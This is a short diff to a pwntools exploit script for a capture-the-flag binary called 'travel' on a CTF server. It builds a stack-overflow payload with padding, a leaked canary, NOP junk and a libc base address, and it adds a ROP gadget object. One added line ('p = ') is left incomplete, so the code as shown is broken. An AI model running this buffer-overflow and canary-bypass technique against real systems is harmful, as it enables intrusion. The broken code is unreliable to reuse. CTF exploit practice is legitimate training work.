@@ -1,5 +1,4 @@
 from pwn import *
-import threading
 from struct import pack
 
 # settings
@@ -7,6 +6,8 @@ context.log_level = 'WARNING'
 context.terminal = ['konsole', '-e']
 
 libc = ELF('./libc.so.6')
+libc_gtg = ROP(libc)
+
 LOCAL = "./travel"
 REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 50106]
 
@@ -40,6 +41,8 @@ class Exploit:
         payload = b"A"*(self.buffer_max-15)     # padding - formatstring
         payload += canary                       # canary value
         payload += b'\x90'*8                    # junk
+        
+        p = 
         
         payload += pack("<Q", self.libc_base)
         
